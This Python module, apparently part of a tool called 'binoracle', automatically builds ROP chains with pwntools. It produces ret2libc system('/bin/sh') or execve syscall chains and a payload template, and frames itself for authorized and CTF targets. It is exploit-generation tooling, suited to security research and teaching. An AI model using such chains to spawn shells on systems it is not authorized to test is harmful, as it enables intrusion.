"""ROP chain builder (pwntools-backed).

Builds a concrete ROP chain for an AUTHORIZED target / CTF binary: ret2libc system('/bin/sh')
when possible, otherwise an execve('/bin/sh') syscall chain. Returns the chain, a pwntools
snippet, and an honest note about what is still needed (e.g. a libc leak under PIE)."""
from __future__ import annotations

from typing import Optional

try:
    import os as _os
    _os.environ.setdefault('PWNLIB_NOTERM','1')
    from pwn import context, ELF, ROP  # type: ignore
    from binoracle import _quiet_pwn as _qp; _qp()
    _HAVE_PWN = True
except Exception:
    _HAVE_PWN = False


def build_rop_chain(binary: str, goal: str = "auto", libc_path: Optional[str] = None) -> str:
    if not _HAVE_PWN:
        return "pwntools not installed: pip install pwntools to enable the ROP builder."
    try:
        context.clear()
        elf = ELF(binary, checksec=False)
        context.binary = elf
    except Exception as e:
        return f"could not load binary: {e}"

    out = [f"# ROP chain for {binary}", f"# arch={context.arch}  pie={elf.pie}  nx={elf.nx}"]
    if elf.pie:
        out.append("# WARNING: PIE is enabled -> addresses are randomized. You need a leak to "
                   "rebase the ELF/libc before this chain is valid.")

    binsh = next(elf.search(b"/bin/sh\x00"), None)
    libc = None
    if libc_path:
        try:
            libc = ELF(libc_path, checksec=False)
        except Exception as e:
            out.append(f"# libc load failed: {e}")

    rop = ROP(elf)

    # Strategy 1: ret2libc system('/bin/sh') using the binary's own PLT/symbols.
    have_system = ("system" in elf.plt) or ("system" in (elf.symbols or {}))
    if goal in ("auto", "system", "ret2libc") and have_system and binsh is not None:
        sys_addr = elf.plt.get("system") or elf.symbols.get("system")
        try:
            rop.raw(rop.ret.address)  # stack alignment (movaps) safety on x86-64
        except Exception:
            pass
        try:
            rop.call(sys_addr, [binsh])
            out.append("# strategy: ret2libc system('/bin/sh')")
            out.append(_render(rop, elf))
            return "\n".join(out)
        except Exception as e:
            out.append(f"# system() chain failed: {e}")

    # Strategy 2: execve('/bin/sh', 0, 0) via syscall gadgets (works for static binaries).
    if goal in ("auto", "execve", "syscall") and binsh is not None:
        try:
            rop.execve(binsh, 0, 0)
            out.append("# strategy: execve('/bin/sh', 0, 0) via syscall gadgets")
            out.append(_render(rop, elf))
            return "\n".join(out)
        except Exception as e:
            out.append(f"# execve syscall chain failed (need syscall/pop gadgets): {e}")

    # Strategy 3: ret2libc with a provided libc (needs a leak, but we can lay out the plan).
    if libc is not None and goal in ("auto", "system", "ret2libc"):
        out.append("# strategy: ret2libc via provided libc (fill libc_base from your leak):")
        out.append(f"#   system = libc_base + {hex(libc.symbols.get('system', 0))}")
        binsh_off = next(libc.search(b"/bin/sh\\x00"), None)
        out.append(f"#   /bin/sh = libc_base + {hex(binsh_off) if binsh_off else '??'}")
        out.append("#   chain = p64(pop_rdi) + p64(libc_base+binsh) + p64(ret) + p64(libc_base+system)")
        return "\n".join(out)

    out.append("# Could not build a chain automatically.")
    if binsh is None:
        out.append("# - no '/bin/sh' string in the binary; provide a libc (--libc) for ret2libc.")
    out.append("# - inspect gadgets with: binoracle gadgets <bin> -f 'pop rdi'")
    return "\n".join(out)


def _render(rop, elf) -> str:
    lines = ["\n## chain layout (pwntools):", "```", rop.dump(), "```"]
    lines.append("## use it:")
    lines.append("```python")
    lines.append("from pwn import *")
    lines.append(f"elf = context.binary = ELF({elf.path!r})")
    lines.append("rop = ROP(elf)")
    lines.append("# ... reproduce the calls above, then:")
    lines.append("payload = flat({OFFSET: rop.chain()})")
    lines.append("```")
    return "\n".join(lines)
